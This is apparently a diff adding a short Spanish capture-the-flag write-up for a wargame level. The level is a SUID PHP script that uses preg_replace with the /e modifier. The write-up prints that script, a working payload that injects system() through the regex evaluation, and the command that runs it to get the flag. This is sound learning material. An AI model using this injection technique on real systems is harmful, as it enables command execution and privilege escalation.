@@ -1,0 +1,37 @@
+# Aprecio que hay un fichero php con permisos SUID:
+
+#!/usr/bin/php
+
+<?php
+function y($m){
+    $m = preg_replace("/\./", " x ", $m);
+    $m = preg_replace("/@/", " y", $m);
+    return $m;
+}
+
+function x($y, $z) {
+    $a = file_get_contents($y);
+    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+    $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a);
+    return $a;
+}
+
+$r = x($argv[1], $argv[2]);
+
+print $r;
+
+?>
+
+# Veo que en el ficherro se ejecuta /e que es una función de PHP que evalua el resultado de una expresión regular
+# bastante peligrosa y actualmente deprecada que me permite que interprete el resultado de la expresión regular como código PHP.
+# Por lo que creo un fichero /tmp/test.php donde guardo el siguiente código:
+
+[x {${system($z)}}]
+
+# y ejecuto el binario asi:
+# ./level06 /tmp/test.php "'getflag'"
+# Al final esto lo he sacado de probar y probar, en un inicio probaba con la función phpinfo() y funcionó
+# pero para los comandos que utilizan ''' ó """ no terminaba de funcionar por como se escapaban las comillas.
+# Así que como $z realmente no se usaba para ninguna otra cosa en el script la utilicé para meter el comando ahi
+# y evitar que me escapara estos caracteres.  
+
